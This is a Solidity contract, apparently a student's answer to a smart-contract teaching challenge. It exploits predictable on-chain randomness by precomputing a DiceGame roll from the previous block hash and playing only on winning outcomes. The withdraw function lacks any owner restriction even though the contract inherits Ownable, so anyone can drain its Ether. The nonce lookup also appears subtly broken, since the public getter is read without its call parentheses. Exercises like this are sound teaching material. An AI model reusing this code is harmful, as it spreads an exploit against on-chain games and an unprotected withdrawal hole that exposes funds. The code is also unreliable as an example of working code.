pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    address private _address;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
        _address = diceGameAddress;
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable specifiedAddress, uint256 amount) external {
        require(address(this).balance >= amount, "Address balance is under the amount");
        specifiedAddress.transfer(amount);
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public payable {
        require(address(this).balance >= .002 ether, "Not enough ether");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, _address, diceGame.nonce));
        uint256 roll = uint256(hash) % 16;

        require(roll <= 5, "Failed");
        diceGame.rollTheDice{value: msg.value}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}   
}
